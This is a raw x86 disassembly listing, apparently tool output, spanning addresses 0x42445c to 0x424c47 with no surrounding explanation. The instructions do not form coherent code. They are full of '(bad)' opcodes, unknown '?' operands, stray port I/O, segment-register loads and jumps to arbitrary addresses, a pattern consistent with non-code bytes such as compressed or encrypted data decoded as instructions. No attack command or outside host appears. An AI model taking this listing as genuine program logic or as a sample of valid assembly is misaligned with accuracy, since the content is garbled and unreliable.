  42445c:	mov    WORD PTR [esp+ecx*4+0x35169bc5],es
  424463:	jge    0x42447e
  424465:	push   edx
  424466:	add    edx,edx
  424468:	mov    eax,ds:0xd060784c
  42446d:	mov    ebx,0xafe9c857
  424472:	lea    eax,[ecx+0x6f1a6561]
  424478:	pop    edi
  424479:	shl    DWORD PTR [ebp+eax*8+0x16],1
  42447d:	sub    esp,DWORD PTR [edi-0x3fe1628]
  424483:	mov    al,0x65
  424485:	cmp    eax,0x345bd23c
  42448a:	pop    ebx
  42448b:	out    0x74,al
  42448d:	test   DWORD PTR [edx],ebp
  42448f:	dec    esp
  424490:	and    ah,bh
  424492:	ret    
  424493:	js     0x42448e
  424495:	cwde   
  424496:	xor    DWORD PTR [ebp-0x79],ecx
  424499:	sahf   
  42449a:	outs   dx,BYTE PTR ds:[esi]
  42449b:	push   edx
  42449c:	cmp    cl,BYTE PTR [ebp-0x37]
  42449f:	xor    ebx,edx
  4244a1:	test   eax,0xe4465cda
  4244a6:	mov    eax,ds:0x79af6926
  4244ab:	popf   
  4244ac:	sbb    ah,dl
  4244ae:	and    eax,0x24c75ada
  4244b3:	mov    ds,WORD PTR [edx-0x4169e7c1]
  4244b9:	or     al,0x29
  4244bb:	loopne 0x4244e5
  4244bd:	inc    ecx
  4244be:	aad    0xcc
  4244c0:	clc    
  4244c1:	xchg   DWORD PTR [edx],esp
  4244c3:	adc    ebx,eax
  4244c5:	dec    esi
  4244c6:	lds    ebx,FWORD PTR fs:[ebp-0x69]
  4244ca:	gs jmp 0x344dfc4f
  4244d0:	dec    ebx
  4244d1:	jne    0x42445e
  4244d3:	(bad)  [esi+0x6c]
  4244d6:	lods   eax,DWORD PTR ds:[esi]
  4244d7:	not    BYTE PTR [ecx+0x6628adce]
  4244dd:	jl     0x424492
  4244df:	xor    al,BYTE PTR [edi-0x38]
  4244e2:	sub    ebx,DWORD PTR ds:0xf1362548
  4244e8:	sbb    esi,edi
  4244ea:	sahf   
  4244eb:	xlat   BYTE PTR ds:[ebx]
  4244ec:	mov    gs,WORD PTR [esi]
  4244ee:	inc    ecx
  4244ef:	out    dx,al
  4244f0:	je     0x424536
  4244f2:	addr16 in eax,0x2e
  4244f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4244f6:	leave  
  4244f7:	adc    BYTE PTR [esi],ch
  4244f9:	jl     0x424524
  4244fb:	retf   
  4244fc:	jge    0x424484
  4244fe:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424500:	pop    es
  424501:	sbb    eax,0xeb9e765d
  424506:	retf   
  424507:	push   ss
  424508:	jo     0x4244e0
  42450a:	in     eax,dx
  42450b:	and    al,BYTE PTR [eax+0x1177be55]
  424511:	adc    al,0xa8
  424513:	pop    ebp
  424514:	jmp    0x424582
  424516:	jl     0x424583
  424518:	jo     0x424511
  42451a:	call   FWORD PTR [edx-0x6e]
  42451d:	pop    ecx
  42451e:	or     BYTE PTR [edx],al
  424520:	aaa    
  424521:	test   eax,0xb141134d
  424526:	mov    ebx,DWORD PTR [ebx-0x61]
  424529:	(bad)  
  42452a:	pushf  
  42452b:	mov    ds:0x1909b83c,eax
  424530:	ins    BYTE PTR es:[edi],dx
  424531:	mov    esp,0x4896c6e
  424536:	je     0x424538
  424538:	adc    bh,BYTE PTR [ebp+edi*4-0x184b2526]
  42453f:	je     0x424597
  424541:	adc    DWORD PTR [ebx+0x30],ebx
  424544:	jae    0x4244f2
  424546:	je     0x424559
  424548:	mov    ds:0x7d4ef5a8,al
  42454d:	ins    DWORD PTR es:[edi],dx
  42454e:	jnp    0x4245c5
  424550:	in     eax,dx
  424551:	ret    0x2669
  424554:	pop    esp
  424555:	mov    bl,al
  424557:	pop    ss
  424558:	mov    al,ds:0xb63ae586
  42455d:	adc    ch,BYTE PTR [ecx]
  42455f:	or     bh,ah
  424561:	dec    esi
  424562:	rol    DWORD PTR [edi+0x1a4b7122],0x8a
  424569:	push   edi
  42456a:	ins    BYTE PTR es:[edi],dx
  42456b:	aas    
  42456c:	fs ret 0x443f
  424570:	pop    ss
  424571:	mov    ss,WORD PTR [edi-0xd]
  424574:	cmp    eax,0x4fe640c8
  424579:	pusha  
  42457a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42457b:	test   BYTE PTR [ebp-0x1e7e196a],0xb5
  424582:	or     al,0x75
  424584:	push   esi
  424585:	mov    DWORD PTR ds:0xab109416,ebx
  42458b:	mov    dl,0xd1
  42458d:	mov    esp,0x601d458
  424592:	xor    esp,ebx
  424594:	push   es
  424595:	xchg   esi,eax
  424596:	cwde   
  424597:	add    DWORD PTR [ebp+0x5c],0x4ae094fa
  42459e:	ins    BYTE PTR es:[edi],dx
  42459f:	call   FWORD PTR [ebx]
  4245a1:	mov    ch,0xfc
  4245a3:	fst    QWORD PTR [ebp-0x7a]
  4245a6:	pop    ss
  4245a7:	cmp    ch,BYTE PTR [ecx-0x445268a3]
	...
  4245b9:	add    BYTE PTR [esi],cl
  4245bb:	and    BYTE PTR [eax-0x404051c1],cl
  4245c1:	xor    edi,edx
  4245c3:	sub    dh,BYTE PTR [eax-0x551e3349]
  4245c9:	aam    0x72
  4245cb:	mov    esi,0x1fb0001
  4245d0:	add    BYTE PTR [eax],al
  4245d2:	pop    esi
  4245d3:	rcr    BYTE PTR [edi+ecx*8-0xad05995],0xc2
  4245db:	xchg   esi,eax
  4245dc:	mov    ebx,0x97954902
  4245e1:	outs   dx,BYTE PTR ds:[esi]
  4245e2:	sti    
  4245e3:	adc    bl,cl
  4245e5:	in     al,dx
  4245e6:	xchg   edi,eax
  4245e7:	sbb    ebx,edx
  4245e9:	jbe    0x4245b4
  4245eb:	mov    esp,0xe0c80bab
  4245f0:	add    al,0x9e
  4245f2:	sub    ebp,DWORD PTR [edx]
  4245f4:	jle    0x42462d
  4245f6:	inc    esp
  4245f7:	shr    DWORD PTR [edx+esi*4],cl
  4245fa:	je     0x4245e1
  4245fc:	and    DWORD PTR [ebx-0x36],eax
  4245ff:	sub    ebx,DWORD PTR [edx+0x48]
  424602:	adc    ebp,DWORD PTR [esi]
  424604:	push   cs
  424605:	jno    0x424674
  424607:	mov    BYTE PTR [esi+edx*2],bh
  42460a:	aad    0xac
  42460c:	mov    bh,0xa5
  42460e:	jnp    0x424684
  424610:	ror    BYTE PTR [ecx-0x3c],cl
  424613:	iret   
  424614:	call   FWORD PTR [ebx-0x6ffbd66c]
  42461a:	push   ecx
  42461b:	push   es
  42461c:	xor    BYTE PTR [edx+0x4d789bc7],ch
  424622:	push   ss
  424623:	aam    0x4d
  424625:	sbb    BYTE PTR [esi],bh
  424627:	push   esp
  424628:	xchg   ebp,eax
  424629:	int    0x71
  42462b:	sub    edx,DWORD PTR [ebx-0x193e2f08]
  424631:	adc    eax,0x7e6a62a
  424636:	mov    edx,0x9f2f8380
  42463b:	and    BYTE PTR [edx-0x6ee8b47d],bh
  424641:	not    ch
  424643:	inc    eax
  424644:	popa   
  424645:	sub    al,0x62
  424647:	test   DWORD PTR [esi+0x3238de79],esi
  42464d:	mov    ?,ecx
  42464f:	test   eax,0xcd5aabe5
  424654:	imul   esp,DWORD PTR [edi+0x399452a0],0xffffff9c
  42465b:	jmp    0xa0b77a59
  424660:	and    bl,dh
  424662:	sahf   
  424663:	xchg   ebx,eax
  424664:	fidiv  DWORD PTR [esi-0x3763be0a]
  42466a:	mul    DWORD PTR [edx-0x7da16a48]
  424670:	push   ss
  424671:	xchg   esp,eax
  424672:	in     al,0xf4
  424674:	test   DWORD PTR [ecx-0x77365083],edx
  42467a:	inc    eax
  42467b:	inc    esi
  42467c:	in     al,0x75
  42467e:	mov    eax,ds:0x49282271
  424683:	and    bl,bl
  424685:	leave  
  424686:	push   ecx
  424687:	mov    ds:0xff6e0c52,al
  42468c:	loop   0x42468a
  42468e:	mov    edi,esi
  424690:	mov    ebp,0x79e9902c
  424695:	in     eax,dx
  424696:	or     DWORD PTR [ebx-0x38],eax
  424699:	fs pushf 
  42469b:	rcr    DWORD PTR [esi],0xc9
  42469e:	sbb    BYTE PTR [ebp+0x7b72bc00],al
  4246a4:	iret   
  4246a5:	and    BYTE PTR [ecx],0xf
  4246a8:	lods   eax,DWORD PTR ds:[esi]
  4246a9:	retf   
  4246aa:	jp     0x42466e
  4246ac:	dec    edx
  4246ad:	adc    eax,0xfdb31975
  4246b2:	loope  0x424677
  4246b4:	inc    esi
  4246b5:	xor    esp,edx
  4246b7:	sub    DWORD PTR [ebx+ecx*8-0x5a451ea0],edi
  4246be:	sar    edx,0x2c
  4246c1:	xchg   esp,eax
  4246c2:	xchg   esi,eax
  4246c3:	je     0x424710
  4246c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4246c6:	xor    DWORD PTR [edi-0xe06e6d1],ebp
  4246cc:	retf   
  4246cd:	lods   al,BYTE PTR ds:[esi]
  4246ce:	gs jle 0x42472a
  4246d1:	mov    WORD PTR [bp+di],es
  4246d4:	sub    al,0xc9
  4246d6:	out    dx,eax
  4246d7:	stos   DWORD PTR es:[edi],eax
  4246d8:	mov    ah,0x74
  4246da:	hlt    
  4246db:	jle    0x424669
  4246dd:	js     0x424664
  4246df:	push   esi
  4246e0:	fsub   QWORD PTR [esp]
  4246e3:	in     al,0x19
  4246e5:	mov    bh,0xac
  4246e7:	pop    edx
  4246e8:	inc    ebp
  4246e9:	sub    eax,0x646d9d76
  4246ee:	mov    ebx,0x57fc70d9
  4246f3:	and    cl,BYTE PTR [edx+edx*4]
  4246f6:	mov    ?,WORD PTR [ecx-0x21]
  4246f9:	and    BYTE PTR [esi-0x3b11e0f7],bl
  4246ff:	jno    0x42476a
  424701:	fisttp WORD PTR [ebx-0x73e99b5c]
  424707:	fld    DWORD PTR [eax+edi*4]
  42470a:	mov    ss,ebp
  42470c:	sub    bl,ah
  42470e:	xor    eax,0xa47791f5
  424713:	push   ss
  424714:	icebp  
  424715:	test   ecx,ecx
  424717:	mov    al,ds:0x25ba4ca9
  42471c:	or     al,BYTE PTR ds:0xb40c
  424721:	dec    ebp
  424722:	mov    esp,0x166b0b91
  424727:	out    0xb1,al
  424729:	and    al,0x87
  42472b:	dec    ebx
  42472c:	scas   eax,DWORD PTR es:[edi]
  42472d:	add    DWORD PTR [ebx],ecx
  42472f:	popf   
  424730:	cmp    BYTE PTR [eax+ecx*1-0x648c7722],0x68
  424738:	data16 mov dl,0xcd
  42473b:	cmp    esi,DWORD PTR fs:[ecx-0x23]
  42473f:	and    DWORD PTR [ecx-0x7b30c470],edi
  424745:	jb     0x424777
  424747:	jp     0x424743
  424749:	mov    edi,0xf61a0c22
  42474e:	cwde   
  42474f:	xor    bl,BYTE PTR [ebx]
  424751:	fisttp DWORD PTR [edx-0x7ffc3ef9]
  424757:	pop    edx
  424758:	push   0x78
  42475a:	xchg   edi,eax
  42475b:	int    0xc2
  42475d:	jne    0x4246e5
  42475f:	push   edx
  424760:	inc    ebx
  424761:	adc    DWORD PTR [esi+0x60],0xffffffd1
  424765:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424766:	xor    BYTE PTR [edi+0x9],bh
  424769:	int    0xc4
  42476b:	jle    0x4247ad
  42476d:	dec    ecx
  42476e:	test   eax,0x55d9e92c
  424773:	popa   
  424774:	and    ch,BYTE PTR [edx+ebp*2+0x38ca8020]
  42477b:	lahf   
  42477c:	pop    esi
  42477d:	in     al,0x1c
  42477f:	or     eax,0xa8530a63
  424784:	pop    ss
  424785:	lods   eax,DWORD PTR ds:[esi]
  424786:	inc    edi
  424787:	mov    edi,0xa10d4f2e
  42478c:	les    ecx,FWORD PTR [edx+0x4b]
  42478f:	sbb    dl,dl
  424791:	pop    ecx
  424792:	and    edi,DWORD PTR [eax-0x40]
  424795:	sub    cl,BYTE PTR [ebx-0x7e]
  424798:	mov    fs,WORD PTR [ebx]
  42479a:	push   edi
  42479b:	cld    
  42479c:	push   ss
  42479d:	pop    edx
  42479e:	mov    ds:0x3992fdcc,al
  4247a3:	or     eax,0xb5fd5a82
  4247a8:	bound  edi,QWORD PTR [esi-0x51f1a17e]
  4247ae:	push   ds
  4247af:	push   ebx
  4247b0:	lods   al,BYTE PTR ds:[esi]
  4247b1:	retf   0x9d8c
  4247b4:	sub    esp,DWORD PTR [ecx]
  4247b6:	dec    eax
  4247b7:	pop    edi
  4247b8:	mov    bh,0x32
  4247ba:	sahf   
  4247bb:	mov    ds:0x26b1a2ca,eax
  4247c0:	sub    esi,DWORD PTR [edx]
  4247c2:	mov    dh,0xb9
  4247c4:	aad    0x80
  4247c6:	out    dx,eax
  4247c7:	neg    ah
  4247c9:	pop    ds
  4247ca:	(bad)  
  4247cb:	fmulp  st(0),st
	...
  4247d9:	add    BYTE PTR [edi+edi*4+0x63],bl
  4247dd:	push   eax
  4247de:	jecxz  0x4247bc
  4247e0:	jg     0x4247a1
  4247e2:	data16 adc al,0x63
  4247e5:	sbb    al,0x6a
  4247e7:	mov    ebp,0xc06d8b8e
  4247ec:	add    DWORD PTR [eax],eax
  4247ee:	sti    
  4247ef:	add    DWORD PTR [eax],eax
  4247f1:	add    BYTE PTR [ebx+0x4e],dh
  4247f4:	push   0x44
  4247f6:	mov    edx,0x704a726d
  4247fb:	nop
  4247fc:	jg     0x424799
  4247fe:	inc    ebx
  4247ff:	sti    
  424800:	jmp    0x424785
  424802:	sbb    eax,0xf55c1b6
  424807:	and    edi,DWORD PTR [esi+0x7bf79adc]
  42480d:	inc    esp
  42480e:	iret   
  42480f:	sbb    BYTE PTR [ebp+0x47],bl
  424812:	cmp    eax,0xcebff688
  424817:	mov    BYTE PTR [edi-0x6a8c6c0f],dh
  42481d:	fwait
  42481e:	push   eax
  42481f:	bound  esi,QWORD PTR [eax+0x64]
  424822:	cwde   
  424823:	cmp    ah,BYTE PTR [ebp-0x32]
  424826:	sar    ebp,cl
  424828:	sbb    dl,BYTE PTR [ebp+0x17]
  42482b:	pushf  
  42482c:	add    al,0x4
  42482e:	xchg   edx,eax
  42482f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424830:	test   eax,0x731f5252
  424835:	xchg   ebp,edx
  424837:	retf   
  424838:	mov    cl,0x9a
  42483a:	inc    eax
  42483b:	cli    
  42483c:	rol    BYTE PTR [ebx],1
  42483e:	push   eax
  42483f:	mov    ebx,0x8568a1f6
  424844:	mov    esp,0x5fd1d33c
  424849:	pop    ebp
  42484a:	push   ecx
  42484b:	or     BYTE PTR [esi+0xd248e16],ah
  424851:	ror    DWORD PTR [esi+0x3f929924],0xa8
  424858:	inc    ecx
  424859:	xor    BYTE PTR [ecx-0x26],ch
  42485c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42485d:	aas    
  42485e:	cld    
  42485f:	(bad)  
  424860:	xchg   edi,eax
  424861:	lea    esi,[ebx-0xf]
  424864:	in     al,dx
  424865:	outs   dx,BYTE PTR ds:[esi]
  424866:	and    cl,BYTE PTR [ebx-0x43]
  424869:	mov    bh,0x64
  42486b:	jecxz  0x4248d8
  42486d:	xlat   BYTE PTR ds:[ebx]
  42486e:	push   edx
  42486f:	cmp    bl,cl
  424871:	aaa    
  424872:	xchg   edi,eax
  424873:	push   0x70
  424875:	mov    al,0xdf
  424877:	xor    BYTE PTR [ebx-0x2b],bl
  42487a:	imul   esp,DWORD PTR [ecx+0x1d],0xffffffa8
  42487e:	push   eax
  42487f:	pop    DWORD PTR [eiz*1+0x457f9380]
  424886:	inc    eax
  424887:	fidiv  DWORD PTR [ebp-0x80]
  42488a:	mov    dh,0xa8
  42488c:	(bad)  
  42488d:	or     bl,BYTE PTR [ecx-0x507d3ebd]
  424893:	pop    edx
  424894:	dec    edi
  424895:	adc    BYTE PTR [ebp+0x29],0x89
  424899:	in     al,dx
  42489a:	mov    ?,WORD PTR [esi-0x38]
  42489d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42489e:	dec    edi
  42489f:	sbb    al,0x80
  4248a1:	lock dec ebx
  4248a3:	(bad)  
  4248a4:	test   eax,0x82483073
  4248a9:	inc    esi
  4248aa:	icebp  
  4248ab:	das    
  4248ac:	mov    ds:0x603d09a1,eax
  4248b1:	outs   dx,BYTE PTR ds:[esi]
  4248b2:	mov    dl,0x5b
  4248b4:	pop    ds
  4248b5:	test   BYTE PTR [edx-0x70cc0e0d],dl
  4248bb:	jo     0x4248f7
  4248bd:	call   0xba06:0x412b8cc7
  4248c4:	imul   esp,ebp,0x4c
  4248c7:	fist   DWORD PTR [edi-0x7ad3de35]
  4248cd:	cmp    eax,0xc579f826
  4248d2:	outs   dx,BYTE PTR ds:[esi]
  4248d3:	xchg   edi,eax
  4248d4:	bound  edx,QWORD PTR [esi+edx*4+0x6b]
  4248d8:	adc    bh,ah
  4248da:	sbb    eax,0x4b3734d3
  4248df:	outs   dx,DWORD PTR ds:[esi]
  4248e0:	in     eax,dx
  4248e1:	jno    0x424919
  4248e3:	sub    al,0x57
  4248e5:	lahf   
  4248e6:	(bad)  
  4248e7:	jp     0x42488b
  4248e9:	sbb    al,0xfe
  4248eb:	sub    al,BYTE PTR [edi-0x57]
  4248ee:	jns    0x424964
  4248f0:	nop
  4248f1:	imul   edx,DWORD PTR [esi+0x54],0xe1373c8
  4248f8:	fwait
  4248f9:	mov    eax,ds:0xddcd0305
  4248fe:	mov    ch,BYTE PTR [edx+ebx*2-0x7f34303]
  424905:	cdq    
  424906:	out    0xe5,eax
  424908:	packsswb mm4,QWORD PTR [edx+esi*4+0x61]
  42490d:	jg     0x424909
  42490f:	lea    esi,[edi]
  424911:	sbb    al,0x8
  424913:	add    eax,0x805ef222
  424918:	test   al,0x78
  42491a:	cmc    
  42491b:	dec    edx
  42491c:	in     eax,dx
  42491d:	lods   al,BYTE PTR ds:[esi]
  42491e:	stos   DWORD PTR es:[edi],eax
  42491f:	outs   dx,BYTE PTR ds:[esi]
  424920:	mov    eax,ds:0x96f6566a
  424925:	xchg   ebp,eax
  424926:	pusha  
  424927:	loope  0x42491c
  424929:	mov    dh,0x73
  42492b:	iret   
  42492c:	mov    eax,cs
  42492e:	fild   QWORD PTR [edx]
  424930:	jnp    0x424955
  424932:	add    BYTE PTR [ebx],ch
  424934:	mov    BYTE PTR [eax],ah
  424936:	sub    al,0xa4
  424938:	out    0xe2,eax
  42493a:	loop   0x4248e9
  42493c:	mov    al,cl
  42493e:	push   ebx
  42493f:	dec    esi
  424940:	jno    0x424998
  424942:	in     eax,dx
  424943:	mov    dl,0xdb
  424945:	repz mov bh,0xe6
  424948:	sbb    eax,0xcf3e20e4
  42494d:	fmul   st,st(4)
  42494f:	fisubr WORD PTR [esi]
  424951:	in     eax,dx
  424952:	mov    dl,0xa0
  424954:	jmp    0x42490f
  424956:	ds std 
  424958:	bnd jbe 0x4248dc
  42495b:	pop    ecx
  42495c:	jne    0x4248e4
  42495e:	(bad)  
  42495f:	fist   WORD PTR ds:0x9dbd9878
  424965:	ret    0x28a8
  424968:	mov    esi,0x39af50c2
  42496d:	push   eax
  42496e:	cmp    BYTE PTR [eax-0x67f7a18c],dh
  424974:	pushf  
  424975:	mov    dl,0x74
  424977:	retf   0x9489
  42497a:	dec    eax
  42497b:	xchg   ebp,eax
  42497c:	pop    eax
  42497d:	add    al,0x24
  42497f:	sbb    BYTE PTR [ebp+0x52],bl
  424982:	cmp    eax,0x73b882d1
  424987:	pop    eax
  424988:	ja     0x424964
  42498a:	out    0xe8,al
  42498c:	out    dx,eax
  42498d:	stc    
  42498e:	adc    eax,DWORD PTR [edi]
  424990:	out    dx,al
  424991:	daa    
  424992:	aaa    
  424993:	xchg   ecx,eax
  424994:	sbb    DWORD PTR ds:0xaed88c07,esp
  42499a:	arpl   WORD PTR [eax],cx
  42499c:	or     al,0x67
  42499e:	or     al,0x38
  4249a0:	dec    eax
  4249a1:	ins    DWORD PTR es:[edi],dx
  4249a2:	jns    0x4249bd
  4249a4:	(bad)  
  4249a6:	fmul   st,st(2)
  4249a8:	ins    DWORD PTR es:[edi],dx
  4249a9:	test   al,0xe
  4249ab:	ror    DWORD PTR [edi-0x2d8be849],1
  4249b1:	pop    DWORD PTR [edi-0x6f]
  4249b4:	push   ebx
  4249b5:	xor    al,0x3a
  4249b7:	dec    ebp
  4249b8:	jge    0x4249eb
  4249ba:	mov    ebx,0x5ba9e9d1
  4249bf:	icebp  
  4249c0:	or     esi,DWORD PTR [edi]
  4249c2:	cwde   
  4249c3:	call   0x486e3c5e
  4249c8:	imul   ebp,ecx,0xffaa000a
  4249ce:	repnz or DWORD PTR [eax],esp
  4249d1:	dec    esp
  4249d2:	mov    esi,ebp
  4249d4:	lods   al,BYTE PTR ds:[esi]
  4249d5:	ja     0x424a41
  4249d7:	mov    ecx,0x15e15b9a
  4249dc:	jnp    0x424a2c
  4249de:	xchg   ebx,eax
  4249df:	add    ebx,DWORD PTR [eax+ecx*4-0x60ca6256]
  4249e6:	adc    ch,BYTE PTR [ecx+0x4a0a3f77]
  4249ec:	lds    eax,FWORD PTR [eax]
	...
  4249fa:	inc    ebx
  4249fb:	push   ebp
  4249fc:	pusha  
  4249fd:	(bad)  
  4249fe:	jbe    0x4249bf
  424a00:	out    dx,eax
  424a01:	(bad)  
  424a03:	test   al,0x37
  424a05:	stos   DWORD PTR es:[edi],eax
  424a06:	mov    ecx,0x686d938e
  424a0b:	ret    0x1
  424a0e:	sti    
  424a0f:	add    DWORD PTR [eax],eax
  424a11:	add    BYTE PTR [ebx+eiz*8+0x52],dh
  424a15:	es popa 
  424a17:	pushf  
  424a18:	push   es
  424a19:	jb     0x424a08
  424a1b:	pop    esi
  424a1c:	jne    0x4249eb
  424a1e:	loopne 0x4249d5
  424a20:	mov    ecx,0x8e7c5b8c
  424a25:	dec    edx
  424a26:	loop   0x424a2f
  424a28:	out    0x40,al
  424a2a:	loopne 0x424a06
  424a2c:	mov    eax,0xd469396a
  424a31:	pop    esp
  424a32:	push   edi
  424a33:	sub    BYTE PTR [esi-0xe4a5d4],dl
  424a39:	mov    ch,0xa3
  424a3b:	adc    eax,0x177a41ae
  424a40:	dec    edi
  424a41:	lds    edx,FWORD PTR [edx+0x5fc67965]
  424a47:	mov    eax,ds:0x8ae852f4
  424a4c:	dec    ebx
  424a4d:	aas    
  424a4e:	mov    ch,0x7e
  424a50:	push   esi
  424a51:	add    ch,BYTE PTR [edi+ebp*4-0x434d1be7]
  424a58:	loopne 0x424a78
  424a5a:	inc    edi
  424a5b:	xchg   ebp,eax
  424a5c:	pop    ebp
  424a5d:	daa    
  424a5e:	mov    edi,0xe23120c7
  424a63:	pusha  
  424a64:	mov    al,0x85
  424a66:	rol    BYTE PTR [edi+0x7e],cl
  424a69:	dec    esp
  424a6a:	pushf  
  424a6b:	or     BYTE PTR [esi],0xf0
  424a6e:	daa    
  424a6f:	inc    ecx
  424a70:	sbb    DWORD PTR [ebx-0x7d14432c],esi
  424a76:	add    DWORD PTR [ebp+0x764ce1a5],ebp
  424a7c:	js     0x424a75
  424a7e:	push   es
  424a7f:	jmp    0x370:0x341963fb
  424a86:	loope  0x424ae2
  424a88:	jg     0x42f4810a
  424a8e:	in     al,0x5c
  424a90:	xor    al,BYTE PTR [ecx+0x32]
  424a93:	aas    
  424a94:	xchg   ebx,eax
  424a95:	shr    BYTE PTR [ebx+0x3d],0x22
  424a99:	mov    edx,0xda0ebfd0
  424a9e:	scas   al,BYTE PTR es:[edi]
  424a9f:	fabs   
  424aa1:	clc    
  424aa2:	adc    BYTE PTR [ecx+edx*8+0x37dd9521],dh
  424aa9:	jno    0x424a42
  424aab:	in     al,dx
  424aac:	sbb    DWORD PTR [ecx],edx
  424aae:	push   ecx
  424aaf:	jl     0x424a88
  424ab1:	mul    BYTE PTR [edx+eax*2-0x4b]
  424ab5:	in     eax,dx
  424ab6:	pop    eax
  424ab7:	dec    ecx
  424ab8:	retf   
  424ab9:	fiadd  DWORD PTR [ebx]
  424abb:	adc    DWORD PTR [eax],esi
  424abd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424abe:	daa    
  424abf:	jp     0x424aa3
  424ac1:	jecxz  0x424a4c
  424ac3:	sub    dl,cl
  424ac5:	je     0x424b2c
  424ac7:	pop    ecx
  424ac8:	pusha  
  424ac9:	(bad)
  424acd:	loop   0x424a91
  424acf:	or     eax,0x9abbb734
  424ad4:	pop    edx
  424ad5:	inc    esi
  424ad6:	inc    edi
  424ad7:	adc    al,0x63
  424ad9:	cmp    eax,DWORD PTR [ebx-0x3228703e]
  424adf:	clc    
  424ae0:	sub    BYTE PTR [edx],cl
  424ae2:	lods   eax,DWORD PTR ds:[esi]
  424ae3:	lahf   
  424ae4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ae5:	push   ds
  424ae6:	mov    bh,0x7e
  424ae8:	iret   
  424ae9:	push   0x4dfc78bd
  424aee:	xor    al,0x11
  424af0:	in     al,dx
  424af1:	(bad)  
  424af2:	out    dx,al
  424af3:	dec    ecx
  424af4:	js     0x424b25
  424af6:	loop   0x424abb
  424af8:	and    eax,0xf13e1f4f
  424afd:	imul   DWORD PTR [ebx+0x48d8ed3]
  424b03:	enter  0xd579,0x8d
  424b07:	sbb    DWORD PTR gs:[edx-0x2b],eax
  424b0b:	cmc    
  424b0c:	push   edx
  424b0d:	retf   0x6c40
  424b10:	mov    BYTE PTR [eax+0x1e5c8829],bl
  424b16:	mov    esp,0xe959a52b
  424b1b:	push   ds
  424b1c:	and    eax,0xa5092f95
  424b21:	jecxz  0x424b94
  424b23:	jmp    0x424add
  424b25:	test   BYTE PTR [edx-0x36],ah
  424b28:	push   cs
  424b29:	jmp    0xd5aa:0x52f24659
  424b30:	imul   esi,DWORD PTR [ecx+esi*2],0xffffffcc
  424b34:	sbb    eax,DWORD PTR [edi-0x5b]
  424b37:	jp     0x424bb7
  424b39:	inc    edi
  424b3a:	sahf   
  424b3b:	enter  0xe4a0,0xfd
  424b3f:	dec    ecx
  424b40:	daa    
  424b41:	lds    edx,FWORD PTR [ebx+edx*8]
  424b44:	fs int3 
  424b46:	cmp    bl,BYTE PTR [ecx]
  424b48:	sub    BYTE PTR ds:0xddcd5f26,al
  424b4e:	sbb    DWORD PTR [edx-0x13],esp
  424b51:	cmp    DWORD PTR [ebx+edi*8],0x33deddad
  424b58:	ror    DWORD PTR [ecx-0x3af7e272],1
  424b5e:	in     eax,0xff
  424b60:	xor    esi,DWORD PTR [ebp-0x48]
  424b63:	xor    al,0xa3
  424b65:	mov    ebx,0xaafd9a99
  424b6a:	out    0x44,al
  424b6c:	dec    ebx
  424b6d:	xchg   edx,eax
  424b6e:	or     eax,0x8d1c213
  424b73:	pop    ds
  424b74:	pusha  
  424b75:	pop    esp
  424b76:	push   edi
  424b77:	sahf   
  424b78:	leave  
  424b79:	fdiv   QWORD PTR [ebp-0x21]
  424b7c:	call   0x56dc0d2e
  424b81:	pop    eax
  424b82:	mov    eax,ds:0x5abbf01d
  424b87:	fdiv   st,st(1)
  424b89:	jge    0x424b55
  424b8b:	addr16 dec ebx
  424b8d:	shr    BYTE PTR [esi],0x5
  424b90:	inc    esi
  424b91:	div    DWORD PTR [edx-0x6df794dd]
  424b97:	add    al,0x8
  424b99:	mov    dl,0x5d
  424b9b:	scas   eax,DWORD PTR es:[edi]
  424b9c:	ja     0x424b3d
  424b9e:	cli    
  424b9f:	loope  0x424bf2
  424ba1:	mov    bl,0x6
  424ba3:	jp     0x424c0c
  424ba5:	cmovb  ecx,DWORD PTR [ebx+0x7f6d8af9]
  424bac:	or     ebp,eax
  424bae:	stos   BYTE PTR es:[edi],al
  424baf:	xor    al,dl
  424bb1:	cdq    
  424bb2:	push   ebx
  424bb3:	push   0x89c10915
  424bb8:	push   eax
  424bb9:	cwde   
  424bba:	mov    esi,es
  424bbc:	adc    bl,ch
  424bbe:	fdivr  DWORD PTR [eax]
  424bc0:	mov    ch,0x19
  424bc2:	ret    
  424bc3:	lock sbb ch,al
  424bc6:	int3   
  424bc7:	(bad)  
  424bc8:	adc    edi,ebx
  424bca:	xor    DWORD PTR [edx+0x1f],esi
  424bcd:	or     dh,BYTE PTR [ebp-0x14]
  424bd0:	mov    ah,0x34
  424bd2:	push   cs
  424bd3:	push   0x71
  424bd5:	fwait
  424bd6:	push   eax
  424bd7:	loopne 0x424b96
  424bd9:	inc    esi
  424bda:	pop    es
  424bdb:	repz fs imul bh
  424bdf:	xlat   BYTE PTR ds:[ebx]
  424be0:	adc    dh,BYTE PTR [eax-0x2f9b3697]
  424be6:	mov    ds:0x5cb285af,eax
  424beb:	repnz mov dh,0xd7
  424bee:	cdq    
  424bef:	mov    bl,0x22
  424bf1:	adc    eax,0x597b5a7
  424bf6:	jmp    0x3f47b6a2
  424bfb:	out    0x6a,al
  424bfd:	sbb    BYTE PTR [ecx+0x20ca8a61],cl
  424c03:	lahf   
  424c04:	cs add al,0x41
  424c07:	ret    0xd616
  424c0a:	outs   dx,BYTE PTR ds:[esi]
  424c0b:	cmp    cl,bl
	...
  424c19:	add    BYTE PTR [edi+0x2d],dl
  424c1c:	pop    es
  424c1d:	call   0xe967:0xeddfba7f
  424c24:	addr16 xor al,0x9a
  424c27:	aam    0x77
  424c29:	and    al,0x63
  424c2b:	les    eax,FWORD PTR [ecx]
  424c2d:	add    bl,bh
  424c2f:	add    DWORD PTR [eax],eax
  424c31:	add    dh,bh
  424c33:	ja     0x424ca9
  424c35:	sbb    esp,esi
  424c37:	push   ss
  424c38:	or     bh,ch
  424c3a:	das    
  424c3b:	lock ret 0x68b2
  424c3f:	mov    esp,ss
  424c41:	int3   
  424c42:	(bad)  
  424c43:	jbe    0x424cad
  424c45:	add    al,0xcb
  424c47:	shr    DWORD PTR [ecx],1
